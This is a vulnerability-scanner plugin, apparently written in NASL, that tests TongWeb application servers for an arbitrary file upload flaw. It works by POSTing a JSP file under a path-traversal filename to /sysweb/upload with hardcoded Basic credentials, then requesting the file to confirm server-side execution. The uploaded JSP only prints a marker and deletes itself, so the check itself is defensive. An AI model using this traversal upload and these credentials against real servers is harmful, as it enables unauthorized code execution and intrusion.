include("compat.inc");
if (description)
{
  script_id(51799346);
  script_version("1.3");
  script_name(english:"Arbitrary file upload vulnerability in TongWeb application server");
  script_summary(english:"Arbitrary file upload vulnerability in TongWeb application server");
  script_set_attribute(attribute:"description", value:"Arbitrary file upload vulnerability in TongWeb application server.");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"CNLocal");
  script_dependencies("TongWeb_sysweb_passwd.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_keys("TongWeb/port");
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


ports = get_kb_list("TongWeb/port");
foreach port (ports){
	result_r = check_remote(port:port);
	if (result_r['vuln']){
		security_hole(port:port, extra:result_r['report']);
		exit(0);
	}
}

function check_remote(port){
	url = "/sysweb/upload";
	random_str = hexstr(rand_str(length:4));
	name = "../../applications/console/css/"+random_str+".jsp";
	
	url_r = "/console/css/"+random_str+".jsp";
	
	data = '------WebKitFormBoundaryJZDRkcfJsKbeZkM\nContent-Disposition: form-data; name="file"; filename='+name+'\r\nContent-Type: text/plain\r\n\r\n<% out.println("TongWeb_Server_sysweb_FileUpload_Test"); new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundaryJZDRkcfJsKbeZkM--';
	if (get_kb_list("SSL/Transport/"+port)){
		var req =
				'POST ' + url +' HTTP/1.1\r\n' +
				'Host: ' + get_host_ip()+':'+ port+ '\r\n' +
				'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' + '\r\n' +
				'Accept-Encoding: gzip, deflate' + '\r\n' +
				'Authorization: Basic Y2xpOmNsaTEyMy5jb20=' + '\r\n' +
				'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJZDRkcfJsKbeZkM' + '\r\n' +
				'Connection: keep-alive'+ '\r\n' +
				'Accept: */*' + '\r\n' + 
				'\r\n'+data;
				
		ssl_reqs = https_req_get(request:req, port:port);
		if ("200 OK" >< ssl_reqs && "success" >< ssl_reqs){
			res = http_get(item:url_r,port:port);
			ssl_ress = https_req_get(request:res, port:port);
			if("TongWeb_Server_sysweb_FileUpload_Test" >< ssl_ress){
				report = ssl_ress;
				return {'vuln':true, 'report':report};
			}
		}
	}
	else{
		res_send = http_send_recv3(method: "POST",port: port, data:data, item: url,add_headers: make_array("Content-Type","multipart/form-data; boundary=----WebKitFormBoundaryJZDRkcfJsKbeZkM","Authorization", "Basic Y2xpOmNsaTEyMy5jb20="));
		if("success" >< res_send[2] && "200 OK" >< res_send[0]){
			res = http_send_recv3(method: "GET",port: port, item: url_r,add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
			if("TongWeb_Server_sysweb_FileUpload_Test" >< res[2]){
				report = res[2];
				return {'vuln':true, 'report':report};
			}
		}

	}
}
